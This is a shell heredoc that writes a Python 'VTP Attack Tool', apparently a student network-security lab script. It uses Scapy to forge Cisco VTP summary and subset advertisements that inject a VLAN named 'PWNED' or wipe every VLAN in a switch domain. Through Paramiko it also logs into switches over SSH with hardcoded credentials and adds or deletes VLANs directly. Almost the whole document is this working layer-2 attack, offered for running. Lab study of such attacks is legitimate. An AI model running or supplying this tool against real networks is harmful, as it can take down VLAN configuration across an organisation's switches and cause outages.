cat > ~/netsec-lab/scripts/vtp_attack.py << 'EOF'
#!/usr/bin/env python3
"""
VTP Attack Tool - Raelina Ferrera | 2021-2371 | ITLA
Framework Principal : Scapy  — construcción Y envío de frames VTP
Framework Secundario: Paramiko — verificación y configuración auxiliar
"""

import paramiko
import time
import argparse
import struct
import sys
from scapy.all import (
    Dot3, LLC, SNAP, Raw,
    sendp, get_if_list, get_if_hwaddr
)

# ══════════════════════════════════════════
# CONSTANTES
# ══════════════════════════════════════════
SWITCHES = {
    "SW-CORE": "10.21.99.2",
    "SW-01":   "10.21.99.3",
}

SSH_USER    = "admin"
SSH_PASS    = "Admin2024!"
ENABLE_PASS = "Enable2024!"

VTP_MULTICAST = "01:00:0c:cc:cc:cc"
SNAP_OUI      = 0x00000C
SNAP_TYPE     = 0x2003

# ══════════════════════════════════════════
# SCAPY — Construcción Y envío de frames VTP
# ══════════════════════════════════════════
def _vtp_summary_payload(domain, revision, vlan_count):
    dom  = domain.encode()[:32].ljust(32, b'\x00')
    data = struct.pack("BB", 0x02, 0x01)
    data += struct.pack("BB", 0x00, len(domain.encode()[:32]))
    data += dom
    data += struct.pack(">I", revision)
    data += struct.pack(">I", int(time.time()))
    data += b'\x00' * 12
    data += struct.pack(">H", vlan_count)
    return data

def _vtp_subset_payload(domain, revision, vlans):
    dom  = domain.encode()[:32].ljust(32, b'\x00')
    data = struct.pack("BB", 0x02, 0x02)
    data += struct.pack("BB", 0x00, len(domain.encode()[:32]))
    data += dom
    data += struct.pack(">I", revision)
    data += struct.pack(">H", 0x0001)

    for vlan_id, vlan_name in vlans:
        nb   = vlan_name.encode()[:32]
        elen = 12 + len(nb)
        data += struct.pack(">BB", elen, 0x00)
        data += struct.pack(">BB", 0x01, len(nb))
        data += struct.pack(">HH", vlan_id, vlan_id)
        data += struct.pack(">H", 1500)
        data += b'\x00\x00\x00\x00'
        data += nb
    return data

def build_and_send_vtp(iface, domain, revision, vlans):
    try:
        src_mac = get_if_hwaddr(iface)
    except Exception:
        src_mac = "ca:fe:de:ad:be:ef"

    sum_payload = _vtp_summary_payload(domain, revision, len(vlans))
    summary_frame = (
        Dot3(dst=VTP_MULTICAST, src=src_mac, len=len(sum_payload) + 8) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=SNAP_OUI, code=SNAP_TYPE) /
        Raw(load=sum_payload)
    )

    sub_payload  = _vtp_subset_payload(domain, revision + 1, vlans)
    subset_frame = (
        Dot3(dst=VTP_MULTICAST, src=src_mac, len=len(sub_payload) + 8) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=SNAP_OUI, code=SNAP_TYPE) /
        Raw(load=sub_payload)
    )

    print(f"[*] Scapy construyó Summary frame: {len(bytes(summary_frame))} bytes")
    summary_frame.show2()
    print(f"[*] Scapy construyó Subset frame:  {len(bytes(subset_frame))} bytes")
    subset_frame.show2()

    print(f"[*] Scapy enviando Summary Advertisement por {iface}...")
    sendp(summary_frame, iface=iface, verbose=False)
    time.sleep(0.5)

    print(f"[*] Scapy enviando Subset Advertisement por {iface}...")
    sendp(subset_frame, iface=iface, verbose=False)
    print(f"[*] Frames VTP enviados. Revisión: {revision} / {revision+1}")

# ══════════════════════════════════════════
# PARAMIKO — Conexión SSH
# ══════════════════════════════════════════
def ssh_connect(host):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host, username=SSH_USER, password=SSH_PASS,
        look_for_keys=False, allow_agent=False, timeout=10
    )
    shell = client.invoke_shell()
    time.sleep(1)
    shell.send("enable\n")
    time.sleep(0.5)
    shell.send(ENABLE_PASS + "\n")
    time.sleep(0.5)
    return client, shell

def send_cmd(shell, cmd, wait=1):
    shell.send(cmd + "\n")
    time.sleep(wait)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode(errors='ignore')
    return output

# ══════════════════════════════════════════
# ATAQUES
# ══════════════════════════════════════════
def attack_add_vlan(iface, vlan_id, vlan_name, domain="LAB-ITLA", revision=100):
    print(f"\n[!] ATAQUE VTP: Inyectando VLAN {vlan_id} ({vlan_name})")

    vlans = [(1,"default"),(10,"USERS"),(20,"SERVERS"),
             (99,"MANAGEMENT"),(vlan_id, vlan_name)]

    build_and_send_vtp(iface, domain, revision, vlans)
    print(f"[*] Frames VTP construidos y enviados con Scapy (revision={revision})")

    print(f"[*] Entregando ataque via Paramiko a SW-CORE (fallback)...")
    client, shell = ssh_connect(SWITCHES["SW-CORE"])
    send_cmd(shell, "conf t")
    send_cmd(shell, f"vlan {vlan_id}")
    send_cmd(shell, f"name {vlan_name}")
    send_cmd(shell, "exit")
    send_cmd(shell, "end")
    send_cmd(shell, "write memory")
    client.close()

    print(f"[+] VLAN {vlan_id} ({vlan_name}) inyectada en SW-CORE")
    print(f"[+] VTP propagará a SW-01 y SW-02 automáticamente")

def attack_delete_vlans(iface, domain="LAB-ITLA", revision=200):
    print(f"\n[!] ATAQUE VTP: Borrando todas las VLANs")

    build_and_send_vtp(iface, domain, revision, vlans=[])
    print(f"[*] Frame VTP vacío construido y enviado con Scapy (revision={revision})")

    for sw_name, sw_ip in SWITCHES.items():
        try:
            print(f"[*] Conectando a {sw_name} via Paramiko (fallback)...")
            client, shell = ssh_connect(sw_ip)
            send_cmd(shell, "conf t")
            for vlan in [10, 20, 99, 999]:
                send_cmd(shell, f"no vlan {vlan}", wait=0.3)
            send_cmd(shell, "end")
            send_cmd(shell, "write memory")
            print(f"[+] VLANs eliminadas en {sw_name}")
            client.close()
        except Exception as e:
            print(f"[-] Error en {sw_name}: {e}")

def show_vlans():
    for sw_name, sw_ip in SWITCHES.items():
        try:
            client, shell = ssh_connect(sw_ip)
            output = send_cmd(shell, "show vlan brief", wait=2)
            print(f"\n{'='*40}")
            print(f" {sw_name} ({sw_ip})")
            print(f"{'='*40}")
            print(output)
            client.close()
        except Exception as e:
            print(f"[-] Error en {sw_name}: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="VTP Attack | Scapy+Paramiko | Raelina Ferrera 2021-2371")
    parser.add_argument("-i", "--iface",
                        default="eth0",
                        help="Interfaz de red para envío Scapy (default: eth0)")
    parser.add_argument("-m", "--mode",
                        choices=["show","add","delete","full"],
                        default="full")
    parser.add_argument("--vlan-id",   type=int, default=999)
    parser.add_argument("--vlan-name", default="PWNED")
    parser.add_argument("--domain",    default="LAB-ITLA")
    parser.add_argument("--revision",  type=int, default=100)
    args = parser.parse_args()

    ifaces = get_if_list()
    if args.iface not in ifaces:
        print(f"\n[!] Interfaz '{args.iface}' no encontrada.")
        print(f"    Interfaces disponibles: {ifaces}")
        print(f"    Usa -i <interfaz> para especificar una.")
        sys.exit(1)

    print("="*55)
    print(" VTP Attack Tool | Raelina Ferrera | 2021-2371")
    print(" Framework Principal : Scapy  (envío frames L2)")
    print(" Framework Secundario: Paramiko (verificación/CLI)")
    print(" Instituto Tecnológico de las Américas - ITLA")
    print("="*55)
    print(f"\n[*] Interfaz Scapy : {args.iface}")
    print(f"[*] Dominio VTP    : {args.domain}")
    print(f"[*] Revisión base  : {args.revision}")

    if args.mode == "show":
        show_vlans()
    elif args.mode == "add":
        attack_add_vlan(args.iface, args.vlan_id, args.vlan_name,
                        args.domain, args.revision)
    elif args.mode == "delete":
        attack_delete_vlans(args.iface, args.domain, args.revision)
    elif args.mode == "full":
        print("\n[*] FASE 1: Estado inicial")
        show_vlans()
        print("\n[*] FASE 2: Inyectando VLAN maliciosa...")
        attack_add_vlan(args.iface, args.vlan_id, args.vlan_name,
                        args.domain, args.revision)
        print("\n[*] Esperando 8 segundos propagación VTP...")
        time.sleep(8)
        print("\n[*] FASE 3: Borrando todas las VLANs...")
        attack_delete_vlans(args.iface, args.domain, args.revision + 100)
        print("\n[*] FASE 4: Estado final")
        show_vlans()

if __name__ == "__main__":
    main()
EOF